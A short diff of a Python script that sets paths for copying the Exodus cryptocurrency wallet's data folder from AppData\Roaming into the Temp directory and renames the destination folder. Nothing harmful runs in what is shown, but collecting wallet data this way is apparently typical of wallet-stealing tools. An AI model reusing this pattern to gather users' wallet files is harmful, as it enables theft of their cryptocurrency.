@@ -3,7 +3,7 @@ import os.path
 
 client: str = os.path.expanduser("~")
 source_dir = client + "\\AppData\\Roaming\\Exodus"
-dest_dir = client + "\\AppData\\Local\\Temp\\Exodus_backup"
+dest_dir = client + "\\AppData\\Local\\Temp\\Exodus"
 
 class Files: 
     def __init__(self) -> None:
